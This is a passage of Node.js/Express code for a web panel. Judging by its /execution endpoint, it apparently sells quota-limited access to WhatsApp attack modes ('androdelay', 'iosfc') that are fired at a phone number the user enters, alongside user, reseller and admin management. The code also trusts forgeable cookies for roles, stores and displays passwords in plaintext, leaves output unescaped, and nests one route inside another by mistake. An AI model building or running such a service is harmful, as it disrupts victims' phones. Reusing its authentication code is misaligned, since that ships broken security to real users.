      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${user.role}" selected hidden>${user.role}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((user.expired - now) / 86400000));
  const expiredText = new Date(user.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Edit User</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000;
  color: #b19cd9;
  min-height: 100vh;
  padding: 20px;
  position: relative;
  overflow-y: auto; 
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #8a2be2;
      font-family: 'Poppins', sans-serif;
      text-shadow: 0 0 8px rgba(138, 43, 226, 0.7);
    }

    .form-container {
      max-width: 480px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #8a2be2;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
      backdrop-filter: blur(8px);
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #b19cd9;
      font-family: 'Poppins', sans-serif;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: none;
      background: #1a001a;
      color: #b19cd9;
      box-sizing: border-box;
    }

    .expired-info {
      margin-top: -12px;
      margin-bottom: 18px;
      font-size: 12px;
      color: #aaa;
      padding: 12px;
      background: #1a001a;
      border-radius: 10px;
      width: 100%;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #8a2be2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    button:hover {
      background: #9932cc;
      transform: scale(1.02);
    }

    .back-btn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #4b0082;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    .back-btn:hover {
  background: #2a004a;
  transform: scale(1.02);
}

html, body {
    touch-action: manipulation;
    -ms-touch-action: manipulation;
    overflow: hidden;
    position: fixed;
    width: 100%;
    height: 100%;
}

    @media (max-width: 500px) {
      body {
        padding: 16px;
      }

      .form-container {
        padding: 16px;
      }

      input, select {
        padding: 10px;
      }

      button {
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <h2>Edit User: ${user.username}</h2>

    <div class="form-container">
      <form method="POST" action="/edituser">
        <input type="hidden" name="oldusername" value="${user.username}">

        <label>Username</label>
        <input type="text" name="username" value="${user.username}" required>

        <label>Password</label>
        <input type="text" name="password" value="${user.password}" required>

        <label>Expired</label>
        <input type="text" value="${expiredText} - Remaining time: ${sisaHari} more days" disabled class="expired-info">

        <label>Extend</label>
        <input type="number" name="extend" min="0" placeholder="Duration (days)">

        <label>Role</label>
        <select name="role">
          ${roleOptions}
        </select>

        <button type="submit"><i class="fas fa-save"></i> Save Changes</button>
      </form>
    </div>

    <a href="/userlist" class="back-btn" style="display:block; max-width:480px; margin:20px auto;"><i class="fas fa-arrow-left"></i> Back to User List</a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#ffffff',
        lineColor: '#8a2be2',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
        particleRadius: 3,
      });
    });
    // Prevent zoom with pinch gesture
document.addEventListener('touchstart', function(event) {
    if (event.touches.length > 1) {
        event.preventDefault();
    }
}, { passive: false });

document.addEventListener('gesturestart', function(event) {
    event.preventDefault();
});
    // Prevent zoom with Ctrl + +/- keys
document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey === true || e.metaKey === true) && 
        (e.keyCode === 107 || e.keyCode === 109 || e.keyCode === 187 || e.keyCode === 189)) {
        e.preventDefault();
    }
});

// Prevent zoom with pinch gesture
document.addEventListener('wheel', function(e) {
    if (e.ctrlKey) {
        e.preventDefault();
    }
}, { passive: false });
  </script>
</body>
</html>
`;

  res.send(html);
});


app.post("/edituser", (req, res) => {
  const { oldusername, username, password, extend, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldusername);
  if (index === -1) return res.send("❌ User tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user dan tidak bisa ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya boleh edit user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak bisa edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit admin lain.");
  }

  // ❌ Admin tidak bisa set role jadi admin (buat yang lain)
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Perpanjang expired
  const now = Date.now();
  const current = targetUser.expired > now ? targetUser.expired : now;
  const tambahan = parseInt(extend || "0") * 86400000;

  users[index] = {
    ...targetUser,
    username,
    password,
    expired: current + tambahan,
    role
  };

  saveUsers(users);
  res.redirect("/userlist");
});


app.post("/updateuser", (req, res) => {
  const { oldUsername, username, password, expired, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldUsername);
  if (index === -1) return res.send("❌ Username tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh update akun sendiri
  if (sessionUsername === oldUsername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user, dan tidak boleh ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya bisa mengubah user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak boleh edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit sesama admin.");
  }

  // ❌ Admin tidak boleh ubah role ke admin
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Update username & password
  targetUser.username = username;
  targetUser.password = password;

  // ✅ Update expired
  const days = parseInt(expired);
  if (!isNaN(days) && days > 0) {
    const now = Date.now();
    const currentExp = targetUser.expired;
    targetUser.expired = currentExp > now
      ? currentExp + days * 86400000
      : now + days * 86400000;
  }

  // ✅ Ubah role jika owner, atau admin (dengan batasan)
  if (sessionRole === "owner") {
    targetUser.role = role;
  } else if (sessionRole === "admin" && (role === "user" || role === "reseller")) {
    targetUser.role = role;
  }

  saveUsers(users);
  res.redirect("/userlist");
});


app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/login");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
    return res.redirect("/login");
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = `${targetNumber}@s.whatsapp.net`;
  const usageData = getUsageLimit();
  const today = new Date().toISOString().split("T")[0];
  const uname = currentUser.username;
  const role = currentUser.role;

  if (!usageData[uname]) usageData[uname] = {};
  if (!usageData[uname][today]) usageData[uname][today] = 0;

  const limitPerRole = {
    user: 10,
    reseller: 25
  };

  if (limitPerRole[role] !== undefined) {
    const usedToday = usageData[uname][today];
    const limitToday = limitPerRole[role];

    if (usedToday >= limitToday) {
      console.log(`[LIMIT] ${uname} used ${usageData[uname][today]} / ${limitPerRole[role]}`);
      return res.send(executionPage("LIMIT TOAST", {
        message: `❌ Kamu sudah mencapai batas ${limitToday}x hari ini. Coba lagi besok.`,
        toastOnly: true
      }, false, currentUser, "", mode));
    }

    // Tambah counter kalau belum limit
    usageData[uname][today]++;
    saveUsageLimit(usageData);
  }

  if (sessions.size === 0) {
    return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
      message: "Tunggu sampai maintenance selesai..."
    }, false, currentUser, "", mode));
  }

  if (!targetNumber) {
    if (!mode) {
      return res.send(executionPage("✅ Server ON", {
        message: "Pilih mode yang ingin digunakan."
      }, true, currentUser, "", ""));
    }

    if (["androdelay", "androdelay2", "iosfc"].includes(mode)) {
      return res.send(executionPage("✅ Server ON", {
        message: "Masukkan nomor target (62xxxxxxxxxx)."
      }, true, currentUser, "", mode));
    }

    return res.send(executionPage("❌ Mode salah", {
      message: "Mode tidak dikenali. Gunakan ?mode=androdelay atau ?mode=iosfc atau ?mode=androdelay2."
    }, false, currentUser, "", ""));
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.send(executionPage("❌ Format salah", {
      target: targetNumber,
      message: "Nomor harus hanya angka dan diawali dengan nomor negara"
    }, true, currentUser, "", mode));
  }

  try {
    if (mode === "androdelay") {
      DelayAndro(24, target);
    } else if (mode === "iosfc") {
      FcIos(24, target);
    } else if (mode === "androdelay2") {
      DelayAndro2(24, target);
    } else {
      throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPage("✅ S U C C E S", {
      target: targetNumber,
      timestamp: new Date().toLocaleString("id-ID"),
      message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`,
      cleanURL: true  // Parameter baru untuk memberi tahu client membersihkan URL
    }, false, currentUser, "", mode, true));
  } catch (err) {
    return res.send(executionPage("❌ Gagal kirim", {
      target: targetNumber,
      message: err.message || "Terjadi kesalahan saat pengiriman."
    }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
  }
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/");

  const users = getUsers();
  const user = users.find(u => u.username === username);
  if (user && user.isLoggedIn) {
  user.isLoggedIn = false;
    console.log(`[ ${chalk.red('LogOut')} ] -> ${user.username}`);
    saveUsers(users);
  }
  
app.get('/api/cek', async (req, res) => {
  const raw = req.query.nomor;
  if (!raw) {
    return res.status(400).json({ ok: false, error: 'Parameter ?nomor= wajib diisi' });
  }

  let nomor = raw.replace(/[^0-9+]/g, '');

  try {
    const result = await sock.checkStatusWA(nomor);

    res.json({
      ok: true,
      nomor,
      result
    });
  } catch (err) {
    res.status(500).json({
      ok: false,
      error: err.message || 'Terjadi kesalahan saat cek nomor'
    });
  }
});  

  // 🔥 Clear semua cookies biar gak nyangkut
  res.clearCookie("sessionUser");
  res.clearCookie("sessionRole");
  res.clearCookie("isLoggedIn", "true"); // <== ini yang kurang
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`${chalk.green('Server Active On Port')} ${PORT}`);
});